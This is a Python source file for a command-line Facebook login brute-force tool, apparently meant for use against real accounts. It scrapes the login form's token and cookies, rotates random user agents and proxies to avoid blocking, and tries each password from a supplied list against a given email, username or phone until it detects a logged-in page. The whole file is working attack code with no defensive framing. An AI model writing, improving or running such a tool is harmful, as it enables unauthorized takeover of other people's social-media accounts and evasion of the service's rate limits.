# =============> Import <=============
import sys, os, requests, random, logging, time
from bs4 import BeautifulSoup
from termcolor import colored
# =============> Console Colors <=============
class CliColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
# =============> Config <=============
MIN_PASSWORD_LENGTH = 6 # minimum length of the facebook password
MAIN_FB_DOMAIN = 'https://mbasic.facebook.com'
LOGIN_URL = MAIN_FB_DOMAIN+'/login.php'
DEFAULT_TIMEOUT = 2 # request timeout in seconds
USER_AGENTS = []
with open('user-agents.txt', 'rt', newline='', encoding='utf-8') as file:
    USER_AGENTS = file.read().splitlines()
PROXIES = []
with open('proxies.txt', 'rt', newline='', encoding='utf-8') as file:
    PROXIES = file.read().splitlines()
PAYLOAD = {}
COOKIES = {}
HEADERS = {}
# =============> Log <=============
class Log(object):
    def __init__(self, filename):
        super(Log, self).__init__()
        self.filename = filename
        self.logging = logging
        self.logging.basicConfig(format='%(asctime)s %(levelname)s: %(message)s', datefmt='%Y/%m/%d %I:%M:%S %p', filename=filename, level=self.logging.INFO)
    def write(self, msg, color=''):
        print(color+msg)
        self.logging.info(msg)
    def write_colored(self, msg, color=''):
        # Text colors:
        # grey
        # red
        # green
        # yellow
        # blue
        # magenta
        # cyan
        # white

        # Text highlights:
        # on_grey
        # on_red
        # on_green
        # on_yellow
        # on_blue
        # on_magenta
        # on_cyan
        # on_white

        # Attributes:
        # bold
        # dark
        # underline
        # blink
        # reverse
        # concealed
        if color: print(colored(msg, color))
        else: print(msg)
        self.logging.info(msg)
# =============> Functions <=============
def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'referer': LOGIN_URL,
        'content-type': 'application/x-www-form-urlencoded',
        'origin': MAIN_FB_DOMAIN
    }

def form_data(use_proxy=False):
    form = {}
    cookies = {
        'wd': '1366x663',
        'm_pixel_ratio': '1',
        'locale': 'en_US'
    }
    headers = get_random_headers()
    if use_proxy:
        random_proxy = random.choice(PROXIES)
        proxy = {'http': random_proxy}
    else:
        proxy = None

    data = requests.get(LOGIN_URL, headers=headers, proxies=proxy, timeout=DEFAULT_TIMEOUT)
    for i in data.cookies:
        cookies[i.name] = i.value

    data = BeautifulSoup(data.text, 'html.parser').form

    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']

    return form, cookies

def Login(user, password, index=1, use_proxy=False):
    global PAYLOAD, COOKIES, HEADERS
    if len(PAYLOAD) < 1 or len(COOKIES) < 1:
        PAYLOAD, COOKIES = form_data(use_proxy)
    if len(HEADERS) < 1:
        HEADERS = get_random_headers()
    if index % 2 == 0:
        PAYLOAD, COOKIES = form_data(use_proxy)
        HEADERS = get_random_headers()
    PAYLOAD['email'] = user
    PAYLOAD['pass'] = password
    random_proxy = random.choice(PROXIES)
    if use_proxy:
        PROXY = {'http': random_proxy}
    else:
        PROXY = None
    r = requests.post(LOGIN_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS, proxies=PROXY, timeout=DEFAULT_TIMEOUT)
    rurl = r.url.lower()
    rtext = r.text.lower()
    if 'logout' in rtext or 'log out' in rtext:
        return [True, password]
    return [False, password]
# =============> Arguments <=============
def args():
    import argparse
    parser = argparse.ArgumentParser(description='Facebook Login Brute Force')
    parser.add_argument('-u', '--user', help='Email/Username/ID/Phone')
    parser.add_argument('-p', '--password-list', help='Password List Filename')
    parser.add_argument('-sp', '--single-password', help='Password')
    parser.add_argument('--use-proxy', action='store_true', help='Use Proxies')
    parser.add_argument('-l', '--log', help='Log Filename')
    parser.set_defaults(use_proxy=False)
    return parser.parse_args()
# =============> Main <=============
def main(args=None):
    print(CliColors.HEADER+"""
 ____  __    ___  ____  ____   __    __  __ _     ____  ____  _  _  ____  ____     ____  __  ____   ___  ____ 
(  __)/ _\  / __)(  __)(  _ \ /  \  /  \(  / )___(  _ \(  _ \/ )( \(_  _)(  __)___(  __)/  \(  _ \ / __)(  __)
 ) _)/    \( (__  ) _)  ) _ ((  O )(  O ))  ((___)) _ ( )   /) \/ (  )(   ) _)(___)) _)(  O ))   /( (__  ) _) 
(__) \_/\_/ \___)(____)(____/ \__/  \__/(__\_)   (____/(__\_)\____/ (__) (____)   (__)  \__/(__\_) \___)(____)
""")
    print("")

    if args and args.single_password and args.password_list:
        print(CliColors.FAIL+"[x] You can't use single password with password list.")
        sys.exit(-2)

    log_filename = 'logging.log'
    if args and args.log:
        log_filename = args.log
    _log = Log(log_filename)

    if args and args.single_password:
        passwords = [args.single_password]
    else:
        if args and args.password_list:
            password_file = args.password_list
        else:
            password_file = input(CliColors.OKBLUE+"[?] Password List Filename: \t")

        if os.path.exists(password_file):
            with open(password_file, 'rt', newline='', encoding='utf-8') as file:
                passwords = file.read().replace("\r\n", "\n").replace("\r", "\n").split("\n")
        else:
            print(CliColors.FAIL+"[x] Passwords File does not exist.")
            sys.exit(-1)

    if args and args.user:
        user = args.user
    else:
        user = input(CliColors.OKBLUE+"[?] Email/Username/ID/Phone: \t")

    print("")
    print(CliColors.OKCYAN+"[*] Processing...")

    start_time = time.time()
    flag = [False, None]
    index = 1
    for password in passwords:
        try:
            password = password.strip()
            if len(password) < MIN_PASSWORD_LENGTH:
                _log.write_colored("[!] Password '{}' is less than {} characters and has been ignored.".format(password, MIN_PASSWORD_LENGTH), 'grey')
                continue
            _log.write_colored("[*] Attempt #{} with user: '{}' and password: '{}'{}.".format(index, user, password, ' Using Proxy' if args.use_proxy is True else ''), 'yellow')
            LoginOp = Login(user, password, index, args.use_proxy)
            if LoginOp[0]:
                flag = LoginOp
                break
        except Exception as ex:
            _log.write_colored("[!] Caught an Exception: {}".format(str(ex)), 'yellow')
        index += 1
    end_time = time.time() - start_time

    if flag[0]:
        _log.write_colored("[+] Password Found: '{}'.".format(flag[1]), 'green')
    else:
        _log.write_colored("[-] No Password was Found.", 'red')
    
    _log.write_colored("Took {} seconds to complete this operation.".format(str(round(end_time, 2))), 'magenta')
    print("")

if __name__ == '__main__':
    sys.exit(main(args()))